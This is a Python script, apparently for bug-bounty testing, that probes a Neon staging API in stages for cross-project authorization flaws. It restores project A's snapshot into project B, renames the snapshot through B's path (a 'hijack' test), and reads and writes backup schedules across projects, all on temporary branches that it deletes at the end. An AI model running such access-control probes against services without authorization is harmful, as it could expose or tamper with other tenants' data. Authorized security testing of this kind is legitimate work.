# -*- coding: utf-8 -*-
"""Neon staging S2r: snapshot/restore state machine + cross-project refs (resumable).
Zero-destruction: all destructive ops target temp branches only.
State persisted in _s2_state.json; rerun-safe (finds existing temp branches by name).
Stages: 0 prep temp branches -> 1 snapshot sidA -> 2 internal restore window
        -> 3 cross-project restore -> 4 cross-project PATCH -> 5 backup_schedule
        -> 6 cleanup
"""
import json
import os
import time
import ssl
import http.client
import uuid
import sys

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
PB = "damp-term-63384673"
PBMAIN = "br-raspy-band-w247957z"
STATE_F = r"F:\scan\neon_report\_s2_state.json"
LOG = r"F:\scan\neon_report\_s2_out.jsonl"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def log(key, st, out, note=""):
    rec = {"t": time.strftime("%H:%M:%S"), "key": key, "st": st, "note": note,
           "body": (out or "")[:1500]}
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    print("[%s] %-46s -> %s %s" % (rec["t"], key, st, note), flush=True)
    if isinstance(st, int) and st >= 400:
        try:
            e = json.loads(out)
            print("        code=%s msg=%s" % (e.get("code"), e.get("message", "")[:200]),
                  flush=True)
        except Exception:
            print("        raw:", (out or "")[:200], flush=True)


def call(method, path, body=None, timeout=30):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def save_state():
    with open(STATE_F, "w", encoding="utf-8") as fh:
        json.dump(STATE, fh, ensure_ascii=False, indent=1)


def load_state():
    if os.path.exists(STATE_F):
        with open(STATE_F, encoding="utf-8") as fh:
            return json.load(fh)
    return {}


def find_branch(pid, name):
    st, out = call("GET", "/projects/%s/branches" % pid)
    if st == 200:
        for b in json.loads(out).get("branches", []):
            if b.get("name") == name:
                return b.get("id")
    return None


def wait_ready(pid, bid, tries=24, gap=3):
    for _ in range(tries):
        st, out = call("GET", "/projects/%s/branches/%s" % (pid, bid))
        if st == 200:
            b = json.loads(out).get("branch", {})
            if b.get("pending_state") == "ready" or \
                    (b.get("current_state") == "ready" and b.get("pending_state") is None):
                return True, b
        time.sleep(gap)
    return False, None


def stage0_prep():
    tag = STATE["tag"]
    if not STATE.get("brA"):
        name = "s2-%s-a" % tag
        brA = find_branch(PA, name)
        if not brA:
            st, out = call("POST", "/projects/%s/branches" % PA,
                           {"branch": {"name": name, "parent_id": PAMAIN}})
            log("st0 create brA_tmp", st, out)
            brA = json.loads(out).get("branch", {}).get("id") if st in (200, 201) else None
            if not brA:
                raise RuntimeError("brA create failed")
        STATE["brA"] = brA
        save_state()
    if not STATE.get("brB"):
        name = "s2-%s-b" % tag
        brB = find_branch(PB, name)
        if not brB:
            st, out = call("POST", "/projects/%s/branches" % PB,
                           {"branch": {"name": name, "parent_id": PBMAIN}})
            log("st0 create brB_tmp", st, out)
            brB = json.loads(out).get("branch", {}).get("id") if st in (200, 201) else None
            if not brB:
                raise RuntimeError("brB create failed")
        STATE["brB"] = brB
        save_state()
    for pid, key in ((PA, "brA"), (PB, "brB")):
        ok, b = wait_ready(pid, STATE[key])
        log("st0 %s ready" % key, 200 if ok else 500, "",
            "id=%s" % STATE[key] if ok else "NOT READY")
        if not ok:
            raise RuntimeError("%s not ready" % key)
    STATE["stage"] = 1
    save_state()


def stage1_snapshot():
    st, out = call("POST", "/projects/%s/branches/%s/snapshot?name=s2-%s-sid"
                   % (PA, STATE["brA"], STATE["tag"]))
    log("st1 create sidA", st, out)
    sidA = json.loads(out).get("snapshot", {}).get("id") if st == 200 else None
    if not sidA:
        raise RuntimeError("sidA create failed")
    STATE["sidA"] = sidA
    save_state()
    for _ in range(15):
        st2, out2 = call("GET", "/projects/%s/snapshots" % PA)
        snaps = json.loads(out2).get("snapshots", []) if st2 == 200 else []
        hit = [s for s in snaps if s.get("id") == sidA]
        if hit:
            log("st1 sidA listed", st2, out2[:200],
                "sid=%s status=%s" % (sidA, hit[0].get("status")))
            break
        time.sleep(2)
    else:
        log("st1 sidA NOT listed after poll", 500, "")
    STATE["stage"] = 2
    save_state()


def stage2_window():
    sidA = STATE["sidA"]
    time.sleep(2)
    if not STATE.get("brX"):
        st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PA, sidA), {})
        log("st2 restore(no target)", st, out)
        if st == 200:
            b = json.loads(out).get("branch", {})
            STATE["brX"] = b.get("id")
            save_state()
            log("st2 restore branch fields", 200, out,
                "id=%s restore_status=%s restored_from=%s restored_as=%s" % (
                    b.get("id"), b.get("restore_status"), b.get("restored_from"),
                    b.get("restored_as")))
        else:
            raise RuntimeError("restore no-target failed")
    # window: source branch state while restore pending
    st, out = call("GET", "/projects/%s/branches/%s" % (PA, STATE["brA"]))
    if st == 200:
        b = json.loads(out).get("branch", {})
        log("st2 window source branch", st, out[:300],
            "name=%s cur=%s pend=%s restore_status=%s" % (
                b.get("name"), b.get("current_state"), b.get("pending_state"),
                b.get("restore_status")))
    ok, b = wait_ready(PA, STATE["brX"])
    log("st2 window restored branch ready", 200 if ok else 500, "",
        "restore_status=%s" % (b or {}).get("restore_status") if ok else "NOT READY")
    # finalize on the restore branch (normal op; brX identity swap with brA_tmp)
    st, out = call("POST", "/projects/%s/branches/%s/finalize_restore"
                   % (PA, STATE["brX"]), {})
    log("st2 finalize brX", st, out)
    STATE["stage"] = 3
    save_state()


def stage3_cross_restore():
    sidA, brB = STATE["sidA"], STATE["brB"]
    # H1b: own project + own sid, target branch belongs to PB
    st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PA, sidA),
                   {"target_branch_id": brB})
    log("st3 H1b cross-proj target=brB_tmp", st, out)
    # H1a: path project PB + sidA (belongs to PA)
    st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PB, sidA), {})
    log("st3 H1a cross-proj path(PB)+sidA", st, out)
    # H1a': fully cross
    st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PB, sidA),
                   {"target_branch_id": brB})
    log("st3 H1a' full cross restore", st, out)
    STATE["stage"] = 4
    save_state()


def stage4_patch():
    sidA = STATE["sidA"]
    st, out = call("PATCH", "/projects/%s/snapshots/%s" % (PB, sidA),
                   {"snapshot": {"name": "s2-hijack-%s" % STATE["tag"]}})
    log("st4 H3a PATCH path(PB)+sidA", st, out)
    st, out = call("GET", "/projects/%s/snapshots" % PA)
    if st == 200:
        snaps = json.loads(out).get("snapshots", [])
        hit = [s for s in snaps if s.get("id") == sidA]
        log("st4 verify sidA name", st, out[:300],
            "name=%s" % hit[0].get("name") if hit else "sidA GONE")
    STATE["stage"] = 5
    save_state()


def stage5_schedule():
    brA, brB = STATE["brA"], STATE["brB"]
    st, out = call("GET", "/projects/%s/branches/%s/backup_schedule" % (PA, brB))
    log("st5 GET path(PA)+brB cross", st, out)
    st, out = call("GET", "/projects/%s/branches/%s/backup_schedule" % (PB, brA))
    log("st5 GET path(PB)+brA cross", st, out)
    st, out = call("GET", "/projects/%s/branches/%s/backup_schedule" % (PA, brA))
    log("st5 GET baseline", st, out)
    st, out = call("PUT", "/projects/%s/branches/%s/backup_schedule" % (PA, brB),
                   {"schedule": [{"frequency": "daily", "retention_seconds": 604800}]})
    log("st5 PUT path(PA)+brB cross", st, out)
    st, out = call("PUT", "/projects/%s/branches/%s/backup_schedule" % (PA, brA),
                   {"schedule": [{"frequency": "weekly"}]})
    log("st5 PUT own brA", st, out)
    STATE["stage"] = 6
    save_state()


def stage6_cleanup():
    for pid, key in ((PA, "brX"), (PB, "brB"), (PA, "brA")):
        bid = STATE.get(key)
        if not bid:
            continue
        st, out = call("DELETE", "/projects/%s/branches/%s" % (pid, bid))
        log("st6 cleanup %s" % key, st, out)
        time.sleep(2)
    if STATE.get("sidA"):
        st, out = call("DELETE", "/projects/%s/snapshots/%s" % (PA, STATE["sidA"]))
        log("st6 cleanup sidA", st, out)
    STATE["stage"] = 7
    save_state()


def main():
    global STATE
    STATE = load_state()
    if not STATE:
        STATE = {"tag": "s2" + uuid.uuid4().hex[:4], "stage": 0}
        save_state()
    print("== S2r resume: stage=%s tag=%s brA=%s brB=%s sidA=%s brX=%s"
          % (STATE.get("stage"), STATE.get("tag"), STATE.get("brA"),
             STATE.get("brB"), STATE.get("sidA"), STATE.get("brX")), flush=True)
    stages = {0: stage0_prep, 1: stage1_snapshot, 2: stage2_window,
              3: stage3_cross_restore, 4: stage4_patch, 5: stage5_schedule,
              6: stage6_cleanup}
    s = STATE.get("stage", 0)
    while s in stages:
        try:
            stages[s]()
            s = STATE["stage"]
        except Exception as ex:
            log("FATAL stage %s" % s, -1, str(ex)[:500])
            sys.exit(2)
    print("== DONE stage=%s" % STATE.get("stage"), flush=True)


if __name__ == "__main__":
    main()
